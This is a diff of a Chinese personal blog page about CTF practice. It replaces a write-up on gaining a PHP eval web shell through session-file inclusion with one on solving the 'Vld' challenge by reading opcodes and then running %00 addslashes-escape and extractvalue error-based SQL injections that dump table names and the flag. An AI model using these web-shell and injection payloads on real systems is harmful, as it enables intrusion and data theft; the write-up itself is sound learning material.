@@ -17,7 +17,7 @@
   <meta name="description" content="瞎写糊涂账">
   <meta name="author" content="renex">
   <meta name="keywords" content="">
-  <title>20-09-26 - renex的杂烩集</title>
+  <title>20-09-27 - renex的杂烩集</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-09-26 16:23" pubdate>
-        September 26, 2020 pm
+      <time datetime="2020-09-27 19:32" pubdate>
+        September 27, 2020 pm
       </time>
     </span>
   
@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      513 字
+      689 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      9
        分钟
     </span>
   
@@ -217,24 +217,46 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">20-09-26</h1>
+            <h1 style="display: none">20-09-27</h1>
             
             <div class="markdown-body" id="post-body">
-              <p>写完第一个自己的图形化程序后不想再编程了，做ctf冷静一下<br><a id="more"></a></p>
+              <p>不想学java的一天，，图形化编程讲的太碎了，感觉不太好。</p>
 <hr>
-<p>notebook(ichunqiu)<br>每次可以注木马都挺开心的<br>登录界面，查看源码，导航栏分别对应的链接是</p>
+<p>Vld(ichunqiu)<br>进入就是do you know Vulcan Logic Dumper?,顺便也帮我答了false，查看源码发现index.php.txt文件，进去有点像C的汇编语言，网上搜一下发现是zend引擎opcode(中间代码)<br><a href="https://www.php.net/manual/en/internals2.opcodes.php" target="_blank" rel="noopener">官方链接</a><br>大概需要知道的就是：</p>
 <ul>
-<li>./</li>
-<li>./action.php?module=php&amp;file=login</li>
-<li>./action.php?module=php&amp;file=register</li>
+<li>ECHO 显然</li>
+<li>ASSIGN 赋值(assigns value1 to result)，如!0=$a表示为operands中!0, $a</li>
+<li>FETCH_R 获取变量并赋值<br><img src="/2020/09/27/20-09-27/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-09-27%20194550.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"></li>
+<li><p>FETCH_DIM_R对数组获取索引对应值并赋值给变量</p>
+<p><img src="/2020/09/27/20-09-27/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-09-27%20194809.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"></p>
+</li>
+<li>JMPZ 在传来的值为0时跳转（注意是传到JMPZ行的值，即~0！！！）<br><img src="/2020/09/27/20-09-27/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-09-27%20195131.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>这题其他都比较好理解</li>
 </ul>
-<p>没有其他信息，尝试用用户名admin密码password注册，跳转到index.php显示there is no flag（希望没记错），尝试爆破目录没有得到有用的页面，尝试robots.txt得到php1nFo.php，进去后就是php的信息页了。allow_url_include是关着的，放弃直接读的念头，到这一步就有点不知所措了。<br>看题解涨知识：</p>
-<blockquote>
-<p>open_basedir设置用户访问文件的活动范围，其指定的限制实际上是前缀,而不是目录名。 举个例子: 若”open_basedir =/dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都可访问。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。例如设置成:”open_basedir =/dir/user/“<br>session.save_path是session文件存在的位置 session 的文件名格式为 sess_[PHPSESSID]，而sessionid 在发送的请求的 cookie 字段中PHPSESSID值也可以看到</p>
-</blockquote>
-<p>查看open_basedir只能访问tmp，页面上查找发现没有这个目录下的文件。。<br>根据题目提示的文件包含回到登录页面，分析url应该是把file和module拼接后就是访问的界面，尝试module=php&amp;file=php1nFo又是php信息页。</p>
-<p>此时再次搜索tmp发现在session.save_path里有/tmp/SESS，尝试访问这个文件，构造payload：../../../tmp/SESS/sess_+cookie里面PHPSESSID的值，发现显示语言，用户名以及id，这里用户名是可以自己控制的，因此可以上传木马</p>
-<p>重新注册，用户名构造为&lt;?php @eval($_POST[cmd]);?&gt;<br><em>这里之前尝试省去@以及用’cmd’结果都不行，引号可能是被过滤了？但是查资料@只是屏蔽警告信息，为什么不加上也不行呢？mark一下</em><br>之后就可以利用post进行shell啦</p>
+<p>分析出的源代码大概逻辑如下：<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'do you know Vulcan Logic Dumper?&lt;br&gt;'</span></span>
+<span class="php">$a = $_GET[<span class="hljs-string">'flag1'</span>];</span>
+<span class="php">$b = $_GET[<span class="hljs-string">'flag2'</span>];</span>
+<span class="php">$c = $_GET[<span class="hljs-string">'flag3'</span>];</span>
+<span class="php"><span class="hljs-keyword">if</span>($a== <span class="hljs-string">'fvhjjihfcv'</span>)&#123;</span>
+<span class="php">    <span class="hljs-keyword">if</span>($b == <span class="hljs-string">'gfuyiyhioyf'</span>)&#123;</span>
+<span class="php">        <span class="hljs-keyword">if</span>($c == <span class="hljs-string">'yugoiiyhi'</span>)&#123;</span>
+<span class="php">            <span class="hljs-keyword">echo</span> <span class="hljs-string">'the+next+step+is+xxx.zip'</span>;</span>
+<span class="php">        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'flase&lt;br&gt;'</span>;</span>
+<span class="php">    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'flase&lt;br&gt;'</span>;</span>
+<span class="php">&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'flase&lt;br&gt;'</span>;</span>
+<span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'%3C%21--+index.php.txt+%3F%3E%0D%0A%0D%0A'</span></span>
+<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>根据源码构造payload后得到如下显示<br><pre><code class="hljs swift"><span class="hljs-keyword">do</span> you know <span class="hljs-type">Vulcan</span> <span class="hljs-type">Logic</span> <span class="hljs-type">Dumper?</span>  
+the next step <span class="hljs-keyword">is</span> 1chunqiu.<span class="hljs-built_in">zip</span></code></pre><br>下载审计应该是SQL漏洞，由于addslashes函数以及str_replace函数对username中number所含字段的替换，构造出payload: number=0&amp;username=%00’ 从而让单引号逃逸提前闭合查询语句<br><pre><code class="hljs bash"><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from"</span>.<span class="hljs-string">"`"</span>.table_name.<span class="hljs-string">"`"</span>.<span class="hljs-string">"where username="</span>.<span class="hljs-string">"'"</span>.<span class="hljs-string">"<span class="hljs-variable">$username</span>"</span>.<span class="hljs-string">"'"</span></code></pre><br>由于addslashes,username首先变成\0\’，之后str_replace把0替换成空，username就变成了\\’，从而让单引号逃逸<br>进入1chunqiu/login.html尝试填写表单时注入发现不行，直接POST也不行。bp抓包发现POST查询时会变成login.php，直接抓包repeate。<br>回显是sql查询的报错信息，报错注入即可（只写username的值）：</p>
+<ul>
+<li>%00’ and extractvalue(1,concat(0x7e,user(),0x7e))#回显Unknown column ‘x72’ in ‘where clause’</li>
+<li>改成%00’ and extractvalue(1,concat(1,user(),1))#回显user@localhost1，注入应该可行</li>
+<li>%00’ and extractvalue(1,concat(1,database(),1))#得到数据库名ctf1</li>
+<li>%00’ and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),1))#得到两个表名flag以及users1</li>
+<li>%00’ and extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema=database()),1))#得到列名flag,username,password,number1</li>
+<li>上一步按我原本习惯是table_name=’flag’，但是由于addslashes函数导致引号不能用，尝试用十六进制表示，但是str_replace函数会把0替换掉。尝试%df宽字符绕过不知道为什么也不行。尝试table_schema=database() limit 0,1也以为0存在不行。所幸这题数据库的列名不多，很容易就锁定在flag上</li>
+<li>%00‘ and extractvalue(1,concat(1,(select flag from flag),1))#得到flag的一部分，发现没有闭合花括号，回显长度被限制</li>
+<li>%00’ and extractvalue(1,concat(1,substr((select flag from flag),11),1))#显示后半部分，从而得到完整flag</li>
+</ul>
 
             </div>
             <hr>
@@ -258,18 +280,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/09/27/20-09-27/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">20-09-27</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/09/25/20-09-25/">
-                        <span class="hidden-mobile">20-09-25</span>
+                      <a href="/2020/09/26/20-09-26/">
+                        <span class="hidden-mobile">20-09-26</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -412,7 +428,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "20-09-26&nbsp;",
+        "20-09-27&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
